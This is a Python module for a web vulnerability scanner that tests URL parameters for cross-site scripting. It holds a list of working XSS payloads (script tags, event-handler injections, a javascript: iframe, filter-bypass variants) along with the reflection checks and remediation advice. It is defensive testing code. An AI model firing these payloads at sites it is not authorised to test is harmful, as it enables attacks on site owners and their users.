"""Cross-Site Scripting (XSS) testing module"""

import re
from dataclasses import dataclass
from enum import Enum
from typing import Any


class XSSType(Enum):
    """Types of XSS attacks."""

    REFLECTED = "reflected"
    STORED = "stored"
    DOM_BASED = "dom_based"
    BLIND = "blind"


@dataclass
class XSSPayload:
    """
    XSS test payload.

    Attributes:
        payload: The XSS payload string
        xss_type: Type of XSS attack
        description: Description of what this payload tests
        expected_tags: List of HTML tags that should appear in response
        expected_events: List of JavaScript events to check for
        severity: Severity level (low, medium, high, critical)
    """

    payload: str
    xss_type: XSSType
    description: str
    expected_tags: list[str]
    expected_events: list[str]
    severity: str = "high"


class XSSTester:
    """
    Tester for Cross-Site Scripting (XSS) vulnerabilities.

    This class provides methods to test web applications for XSS
    vulnerabilities including reflected, stored, and DOM-based attacks.

    Example:
        tester = XSSTester()

        results = await tester.test_parameter(
            http_client=client,
            target_url="http://example.com/search",
            parameter="q",
            method="GET"
        )

        if results["vulnerable"]:
            print(f"XSS vulnerability found: {results['xss_type']}")
    """

    # Common XSS payloads
    DEFAULT_PAYLOADS: list[XSSPayload] = [
        # Basic reflected XSS
        XSSPayload(
            payload="<script>alert('XSS')</script>",
            xss_type=XSSType.REFLECTED,
            description="Basic script tag injection",
            expected_tags=["<script>", "alert"],
            expected_events=["alert"],
            severity="critical",
        ),
        XSSPayload(
            payload="<img src=x onerror=alert('XSS')>",
            xss_type=XSSType.REFLECTED,
            description="Image tag with onerror event",
            expected_tags=["<img", "onerror"],
            expected_events=["onerror", "alert"],
            severity="critical",
        ),
        XSSPayload(
            payload="<body onload=alert('XSS')>",
            xss_type=XSSType.REFLECTED,
            description="Body tag with onload event",
            expected_tags=["<body", "onload"],
            expected_events=["onload", "alert"],
            severity="critical",
        ),
        XSSPayload(
            payload="<svg onload=alert('XSS')>",
            xss_type=XSSType.REFLECTED,
            description="SVG tag with onload event",
            expected_tags=["<svg", "onload"],
            expected_events=["onload", "alert"],
            severity="critical",
        ),
        XSSPayload(
            payload="<iframe src=javascript:alert('XSS')>",
            xss_type=XSSType.REFLECTED,
            description="Iframe with javascript protocol",
            expected_tags=["<iframe", "javascript:"],
            expected_events=["alert"],
            severity="critical",
        ),
        XSSPayload(
            payload="<input onfocus=alert('XSS') autofocus>",
            xss_type=XSSType.REFLECTED,
            description="Input tag with onfocus event",
            expected_tags=["<input", "onfocus", "autofocus"],
            expected_events=["onfocus", "alert"],
            severity="high",
        ),
        XSSPayload(
            payload="<details open ontoggle=alert('XSS')>",
            xss_type=XSSType.REFLECTED,
            description="Details tag with ontoggle event",
            expected_tags=["<details", "ontoggle"],
            expected_events=["ontoggle", "alert"],
            severity="high",
        ),
        XSSPayload(
            payload="<marquee onstart=alert('XSS')>",
            xss_type=XSSType.REFLECTED,
            description="Marquee tag with onstart event",
            expected_tags=["<marquee", "onstart"],
            expected_events=["onstart", "alert"],
            severity="medium",
        ),
        # Encoded/Obfuscated payloads
        XSSPayload(
            payload="&lt;script&gt;alert('XSS')&lt;/script&gt;",
            xss_type=XSSType.REFLECTED,
            description="HTML encoded script tag",
            expected_tags=["<script>", "alert"],
            expected_events=["alert"],
            severity="medium",
        ),
        XSSPayload(
            payload="<scr<script>ipt>alert('XSS')</scr</script>ipt>",
            xss_type=XSSType.REFLECTED,
            description="Broken script tag to bypass filters",
            expected_tags=["<script>", "alert"],
            expected_events=["alert"],
            severity="medium",
        ),
        XSSPayload(
            payload="<img src=x oneonerrorror=alert('XSS')>",
            xss_type=XSSType.REFLECTED,
            description="Obfuscated onerror event",
            expected_tags=["<img"],
            expected_events=["alert"],
            severity="medium",
        ),
    ]

    def __init__(self, payloads: list[XSSPayload] | None = None):
        """
        Initialize XSS tester.

        Args:
            payloads: Custom list of payloads (uses defaults if None)
        """
        self.payloads = payloads or self.DEFAULT_PAYLOADS
        self._results: list[dict[str, Any]] = []

    async def test_parameter(
        self, http_client: Any, target_url: str, parameter: str, method: str = "GET"
    ) -> dict[str, Any]:
        """
        Test a specific parameter for XSS vulnerabilities.

        Args:
            http_client: HTTP client with async request methods
            target_url: URL to test
            parameter: Parameter name to test
            method: HTTP method (GET or POST)

        Returns:
            Dictionary with test results
        """
        self._results = []
        vulnerabilities = []

        # Test each payload
        for payload in self.payloads:
            result = await self._test_payload(http_client, target_url, parameter, method, payload)

            self._results.append(result)

            if result["vulnerable"]:
                vulnerabilities.append(result)

        return {
            "parameter": parameter,
            "target_url": target_url,
            "method": method,
            "vulnerable": len(vulnerabilities) > 0,
            "vulnerabilities_count": len(vulnerabilities),
            "vulnerabilities": vulnerabilities,
            "all_tests": self._results,
            "recommendations": self._get_recommendations(vulnerabilities),
        }

    async def test_url_reflection(self, http_client: Any, target_url: str) -> dict[str, Any]:
        """
        Test if URL is reflected in page content.

        Args:
            http_client: HTTP client
            target_url: URL to test

        Returns:
            Dictionary with reflection test results
        """
        # Create unique test string
        test_string = "XSS_TEST_12345"
        modified_url = f"{target_url}{'&' if '?' in target_url else '?'}{test_string}"

        try:
            response = await http_client.get(modified_url)
            response_text = getattr(response, "text", "")

            if test_string in response_text:
                return {
                    "url_reflection": True,
                    "message": "URL content is reflected in page. Potential XSS vector.",
                    "severity": "medium",
                }
            else:
                return {
                    "url_reflection": False,
                    "message": "URL content not reflected in page.",
                    "severity": "info",
                }
        except Exception as e:
            return {"url_reflection": False, "error": str(e), "severity": "info"}

    async def _make_request(
        self, http_client: Any, url: str, method: str, params: dict[str, str]
    ) -> dict[str, Any]:
        """Make HTTP request and capture response."""
        try:
            if method.upper() == "GET":
                response = await http_client.get(url, params=params)
            else:
                response = await http_client.post(url, data=params)

            response_text = ""
            if hasattr(response, "text"):
                response_text = response.text
            elif hasattr(response, "content"):
                response_text = response.content.decode("utf-8", errors="ignore")

            return {
                "status_code": getattr(response, "status_code", 200),
                "text": response_text,
                "headers": dict(getattr(response, "headers", {})),
                "error": None,
            }
        except Exception as e:
            return {"status_code": 0, "text": "", "headers": {}, "error": str(e)}

    async def _test_payload(
        self, http_client: Any, target_url: str, parameter: str, method: str, payload: XSSPayload
    ) -> dict[str, Any]:
        """
        Test a single XSS payload.

        Args:
            http_client: HTTP client
            target_url: Target URL
            parameter: Parameter name
            method: HTTP method
            payload: XSSPayload to test

        Returns:
            Dictionary with test result
        """
        response = await self._make_request(
            http_client, target_url, method, {parameter: payload.payload}
        )

        is_vulnerable = False
        evidence = []

        response_text = response["text"]

        # Check if payload is reflected without proper encoding
        # This is the key indicator of XSS vulnerability
        if payload.payload in response_text:
            is_vulnerable = True
            evidence.append(f"Unencoded payload found in response: {payload.payload[:50]}...")

        # Check for expected tags in response
        for tag in payload.expected_tags:
            # Check for both raw and decoded versions
            if tag.lower() in response_text.lower():
                # Check if it's properly encoded
                encoded_versions = [
                    tag.replace("<", "&lt;").replace(">", "&gt;"),
                    tag.replace("<", "%3C").replace(">", "%3E"),
                ]
                if not any(enc in response_text for enc in encoded_versions):
                    is_vulnerable = True
                    evidence.append(f"HTML tag found: {tag}")

        # Check for expected JavaScript events
        for event in payload.expected_events:
            if event.lower() in response_text.lower():
                # Make sure it's not in a properly escaped context
                if f'"{event}' not in response_text and f"'{event}" not in response_text:
                    is_vulnerable = True
                    evidence.append(f"JavaScript event found: {event}")

        # Check for context-specific vulnerabilities
        if self._check_dangerous_context(response_text, payload.payload):
            is_vulnerable = True
            evidence.append("Payload found in dangerous context (script, style, or attribute)")

        return {
            "payload": payload.payload[:100],  # Truncate for reporting
            "xss_type": payload.xss_type.value,
            "description": payload.description,
            "severity": payload.severity,
            "vulnerable": is_vulnerable,
            "evidence": evidence,
            "response_status": response["status_code"],
        }

    def _check_dangerous_context(self, response_text: str, payload: str) -> bool:
        """
        Check if payload appears in dangerous HTML contexts.

        Args:
            response_text: HTML response content
            payload: XSS payload

        Returns:
            True if payload is in dangerous context
        """
        # Check for script tag context
        script_pattern = re.compile(r"<script[^>]*>.*?</script>", re.DOTALL | re.IGNORECASE)
        for match in script_pattern.findall(response_text):
            if payload in match:
                return True

        # Check for event handler context
        event_pattern = re.compile(r'on\w+\s*=\s*["\'][^"\']*', re.IGNORECASE)
        for match in event_pattern.findall(response_text):
            if payload in match:
                return True

        # Check for javascript: protocol
        js_protocol_pattern = re.compile(r"javascript:", re.IGNORECASE)
        _matches = js_protocol_pattern.findall(response_text)

        return False

    def _get_recommendations(self, vulnerabilities: list[dict[str, Any]]) -> list[str]:
        """
        Generate security recommendations based on findings.

        Args:
            vulnerabilities: List of found vulnerabilities

        Returns:
            List of recommendation strings
        """
        if not vulnerabilities:
            return ["No XSS vulnerabilities detected. Continue to validate all user inputs."]

        recommendations = [
            "CRITICAL: Cross-Site Scripting (XSS) vulnerabilities detected!",
            "",
            "Immediate Actions Required:",
            "1. Implement Content Security Policy (CSP) headers",
            "2. Encode/escape all user input before rendering in HTML",
            "3. Use modern frameworks that auto-escape by default (React, Vue, Angular)",
            "4. Validate and sanitize all user input on server-side",
            "",
            "Additional Recommendations:",
            "5. Set HttpOnly flag on sensitive cookies",
            "6. Implement X-XSS-Protection header",
            "7. Use DOMPurify or similar library for client-side sanitization",
            "8. Avoid dangerous HTML methods like innerHTML, document.write()",
            "9. Implement strict input validation with whitelist approach",
            "10. Regular security audits and code reviews",
        ]

        return recommendations

    def add_payload(self, payload: XSSPayload) -> None:
        """
        Add a custom payload to the tester.

        Args:
            payload: XSSPayload to add
        """
        self.payloads.append(payload)

    def get_payloads_by_type(self, xss_type: XSSType) -> list[XSSPayload]:
        """
        Get payloads filtered by XSS type.

        Args:
            xss_type: Type of XSS to filter by

        Returns:
            List of matching payloads
        """
        return [p for p in self.payloads if p.xss_type == xss_type]
